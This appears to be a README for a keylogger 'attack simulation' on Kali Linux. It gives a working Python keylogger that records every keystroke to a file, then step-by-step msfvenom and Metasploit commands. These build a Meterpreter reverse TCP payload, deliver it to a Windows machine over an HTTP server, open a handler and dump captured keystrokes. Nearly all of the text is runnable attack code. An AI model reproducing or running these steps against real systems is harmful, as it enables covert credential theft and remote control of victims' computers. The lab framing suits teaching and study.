ğŸ› ï¸ Installation & Setup
1. Create a Virtual Environment (Recommended on Kali)

Kali restricts global Python installs. Use:

python3 -m venv keyenv
source keyenv/bin/activate
pip install keyboard

2. Install Dependencies
pip install keyboard

3. Run the Keylogger
python3 keylogger.py


The keystrokes will be recorded into:

log.txt

ğŸ’» Example Code (keylogger.py)
import keyboard

with open("log.txt", "a") as f:
    while True:
        key = keyboard.read_event()
        if key.event_type == "down":
            f.write(key.name + "\n")

ğŸ•µï¸ Connecting With Meterpreter (Attack Simulation)
1. Generate a Windows Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_kali_ip> LPORT=4444 -f exe -o payload.exe

2. Transfer Payload to Windows VM

Options:

Python HTTP server

Shared folder

Drag and drop (if enabled)

Example using HTTP server:

On Kali

python3 -m http.server 8080


On Windows
Open browser â†’ http://<kali-ip>:8080/payload.exe

3. Start Metasploit Listener
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <your_kali_ip>
set LPORT 4444
run

4. Use Meterpreter Keylogger

Once the session opens:

meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop


This dumps keystrokes captured directly through Meterpreterâ€™s API.

ğŸ§© How It Works (Technical Breakdown)
Component	Description
keyboard module	Hooks Windows API to detect keypresses
while True loop	Continuously listens for keystrokes
write to file	Stores keystrokes into log.txt
meterpreter keyscan	Injects a DLL into the target process to intercept keyboard events
reverse TCP payload	Creates a commandâ€‘andâ€‘control channel back to attacker
